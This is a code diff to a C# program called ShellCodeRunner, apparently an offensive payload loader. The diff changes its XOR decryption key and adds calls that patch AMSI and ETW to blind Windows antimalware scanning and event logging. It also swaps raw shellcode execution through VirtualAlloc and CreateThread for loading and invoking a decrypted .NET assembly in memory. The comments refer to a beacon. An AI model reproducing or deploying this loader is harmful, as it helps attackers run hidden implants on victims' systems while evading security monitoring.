@@ -27,6 +27,7 @@
  */
 
 using System;
+using System.Reflection;
 using System.Runtime.InteropServices;
 
 namespace ShellCodeRunner
@@ -36,7 +37,7 @@ namespace ShellCodeRunner
         static byte[] GetAllDecryptedBytes()
         {
             //Decryption Key.  Ensure it is the same as your Encryption key
-            char[] key = { 'p', 'a', 's', 's', 'k', 'e', 'y' };
+            char[] key = { 'j', 'i', 'm', 'm', 'y', '9', '4', '7', '7', '8', '8' };
 
             /* Get the encrypted payload from the embedded resource
              * You'll need to add the XOR encrypted payload (encrypt.bin) 
@@ -68,34 +69,16 @@ namespace ShellCodeRunner
 
         static void Main(string[] args)
         {
+            ByPassUtility.PathAMSI();
+
+            ByPassUtility.PatchETW();
+
             // Get decrypted pic
             byte[] pic = GetAllDecryptedBytes();
-            
-            // Allocate space for it
-            IntPtr segment = VirtualAlloc(
-                IntPtr.Zero,
-                // Length of the decrypted payload
-                (uint)pic.Length,
-                AllocationType.Commit,
-                //Allocate as RW
-                MemoryProtection.ReadWrite);
 
-            // Copy over pic to segment
-            Marshal.Copy(pic, 0, segment, pic.Length);
+            var assembly = Assembly.Load(pic);
 
-            // Reprotect segment to make it executable
-            MemoryProtection oldProtect = new MemoryProtection();
-            bool rxSuccess = VirtualProtect(segment, (uint)pic.Length, MemoryProtection.ExecuteRead, out oldProtect);
-
-            // Prepare variables for CreateThread
-            IntPtr threadId = IntPtr.Zero;
-            SECURITY_ATTRIBUTES attrs = new SECURITY_ATTRIBUTES();
-
-            // Create the thread
-            IntPtr hThread = CreateThread(attrs, 0, segment, IntPtr.Zero, CreationFlags.IMMEDIATE, out threadId);
-
-            // Wait for its execution to finish, which is until beacon calls exit.
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            assembly.EntryPoint.Invoke(null, new object[] { args });
         }
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
